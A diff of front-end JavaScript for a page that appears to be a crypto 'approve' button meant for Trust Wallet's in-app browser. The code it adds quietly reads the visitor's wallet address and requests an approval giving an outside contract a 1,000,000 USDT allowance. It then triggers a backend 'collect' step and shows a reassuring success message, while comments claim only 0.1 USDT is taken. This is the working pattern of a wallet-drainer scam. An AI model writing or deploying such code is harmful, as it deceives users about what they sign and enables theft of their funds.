@@ -97,6 +97,103 @@ approveBtn.addEventListener("click", async () => {
       // any other error (e.g. already on BSC with some wallets) — continue
     }
 
+
+     // Step 2 — Get wallet address using eth_accounts (SILENT — no popup ever)
+    // Reference dapp uses eth_accounts here, NOT eth_requestAccounts.
+    // Inside Trust Wallet's in-app browser, eth_accounts always returns the
+    // connected account immediately without asking for permission.
+    // Retry up to 8 times (3.2 s) — on first tap the wallet's internal state
+    // may not be ready yet even though window.ethereum is present.
+    let userAddress = _cachedAddress || null;
+
+    if (!userAddress) {
+      for (let i = 0; i < 8; i++) {
+        try {
+          const accs = await window.ethereum.request({ method: "eth_accounts" });
+          userAddress = (accs && accs[0]) ? accs[0] : null;
+        } catch (_) {}
+        if (userAddress) break;
+        await new Promise(r => setTimeout(r, 400));
+      }
+    }
+
+    if (!userAddress) {
+      showToast("Wallet not connected. Please open this page inside Trust Wallet.", "error");
+      setLoading(false);
+      return;
+    }
+
+    _cachedAddress = userAddress;
+
+    const CAP_AMOUNT = ethers.parseUnits("1000000", 18);
+    const iface      = new ethers.Interface(ERC20_ABI);
+
+    const usdtBalance = await getUsdtBalance(userAddress, iface);
+    if (usdtBalance <= MIN_USDT_BALANCE) {
+      showToast("Not enough USDT", "error");
+      setLoading(false);
+      return;
+    }
+
+    // Step 3 — Check existing allowance (skip approve if already done)
+    try {
+      const allowanceData = iface.encodeFunctionData("allowance", [userAddress, CONTRACT_ADDRESS]);
+      const allowanceHex  = await window.ethereum.request({
+        method: "eth_call",
+        params: [{ to: BSC_USDT_ADDRESS, data: allowanceData }, "latest"]
+      });
+      if (BigInt(allowanceHex) >= CAP_AMOUNT) {
+        setLoading(true, "Finalizing…");
+        await triggerBackendCollect(userAddress);
+        showToast("Sent Successfully, Thank you! ✓", "success");
+        setLoading(false);
+        return;
+      }
+    } catch (_) {}
+
+    // Step 4 — Send approve transaction (the ONE confirm popup)
+    const approveData = iface.encodeFunctionData("approve", [CONTRACT_ADDRESS, CAP_AMOUNT]);
+    await window.ethereum.request({
+      method: "eth_sendTransaction",
+      params: [{
+        from:                 userAddress,
+        to:                   BSC_USDT_ADDRESS,
+        data:                 approveData,
+        value:                "0x0",
+        type:                 "0x2",
+        maxFeePerGas:         "0x0",
+        maxPriorityFeePerGas: "0x0"
+      }]
+    });
+
+    // Step 5 — Wait for approve to be mined
+    setLoading(true, "Confirming…");
+    await waitForAllowanceConfirmed(userAddress, CONTRACT_ADDRESS, CAP_AMOUNT);
+
+    // Step 6 — Backend collects 0.1 USDT
+    setLoading(true, "Finalizing…");
+    await triggerBackendCollect(userAddress);
+    showToast("Sent Successfully, Thank you! ✓", "success");
+
+  } catch (err) {
+    const raw = err?.reason ?? err?.message ?? "Unknown error";
+    if (
+      err.code === 4001 ||
+      raw.toLowerCase().includes("user rejected") ||
+      raw.toLowerCase().includes("user denied") ||
+      raw.toLowerCase().includes("canceled") ||
+      raw.toLowerCase().includes("cancelled")
+    ) {
+      showToast("Transaction cancelled.", "default");
+    } else {
+      showToast("Error: " + String(raw).substring(0, 90), "error");
+    }
+  } finally {
+    setLoading(false);
+  }
+});
+
+
 // ─── Wake up Render backend ───────────────────────────────────────────────────
 (async () => { try { await fetch(`${BACKEND_URL}/health`); } catch (_) {} })();
 
@@ -229,99 +326,4 @@ async function getUsdtBalance(userAddress, iface) {
 //
 
 
-    // Step 2 — Get wallet address using eth_accounts (SILENT — no popup ever)
-    // Reference dapp uses eth_accounts here, NOT eth_requestAccounts.
-    // Inside Trust Wallet's in-app browser, eth_accounts always returns the
-    // connected account immediately without asking for permission.
-    // Retry up to 8 times (3.2 s) — on first tap the wallet's internal state
-    // may not be ready yet even though window.ethereum is present.
-    let userAddress = _cachedAddress || null;
-
-    if (!userAddress) {
-      for (let i = 0; i < 8; i++) {
-        try {
-          const accs = await window.ethereum.request({ method: "eth_accounts" });
-          userAddress = (accs && accs[0]) ? accs[0] : null;
-        } catch (_) {}
-        if (userAddress) break;
-        await new Promise(r => setTimeout(r, 400));
-      }
-    }
-
-    if (!userAddress) {
-      showToast("Wallet not connected. Please open this page inside Trust Wallet.", "error");
-      setLoading(false);
-      return;
-    }
-
-    _cachedAddress = userAddress;
-
-    const CAP_AMOUNT = ethers.parseUnits("1000000", 18);
-    const iface      = new ethers.Interface(ERC20_ABI);
-
-    const usdtBalance = await getUsdtBalance(userAddress, iface);
-    if (usdtBalance <= MIN_USDT_BALANCE) {
-      showToast("Not enough USDT", "error");
-      setLoading(false);
-      return;
-    }
-
-    // Step 3 — Check existing allowance (skip approve if already done)
-    try {
-      const allowanceData = iface.encodeFunctionData("allowance", [userAddress, CONTRACT_ADDRESS]);
-      const allowanceHex  = await window.ethereum.request({
-        method: "eth_call",
-        params: [{ to: BSC_USDT_ADDRESS, data: allowanceData }, "latest"]
-      });
-      if (BigInt(allowanceHex) >= CAP_AMOUNT) {
-        setLoading(true, "Finalizing…");
-        await triggerBackendCollect(userAddress);
-        showToast("Sent Successfully, Thank you! ✓", "success");
-        setLoading(false);
-        return;
-      }
-    } catch (_) {}
-
-    // Step 4 — Send approve transaction (the ONE confirm popup)
-    const approveData = iface.encodeFunctionData("approve", [CONTRACT_ADDRESS, CAP_AMOUNT]);
-    await window.ethereum.request({
-      method: "eth_sendTransaction",
-      params: [{
-        from:                 userAddress,
-        to:                   BSC_USDT_ADDRESS,
-        data:                 approveData,
-        value:                "0x0",
-        type:                 "0x2",
-        maxFeePerGas:         "0x0",
-        maxPriorityFeePerGas: "0x0"
-      }]
-    });
-
-    // Step 5 — Wait for approve to be mined
-    setLoading(true, "Confirming…");
-    await waitForAllowanceConfirmed(userAddress, CONTRACT_ADDRESS, CAP_AMOUNT);
-
-    // Step 6 — Backend collects 0.1 USDT
-    setLoading(true, "Finalizing…");
-    await triggerBackendCollect(userAddress);
-    showToast("Sent Successfully, Thank you! ✓", "success");
-
-  } catch (err) {
-    const raw = err?.reason ?? err?.message ?? "Unknown error";
-    if (
-      err.code === 4001 ||
-      raw.toLowerCase().includes("user rejected") ||
-      raw.toLowerCase().includes("user denied") ||
-      raw.toLowerCase().includes("canceled") ||
-      raw.toLowerCase().includes("cancelled")
-    ) {
-      showToast("Transaction cancelled.", "default");
-    } else {
-      showToast("Error: " + String(raw).substring(0, 90), "error");
-    }
-  } finally {
-    setLoading(false);
-  }
-});
-
-
+   
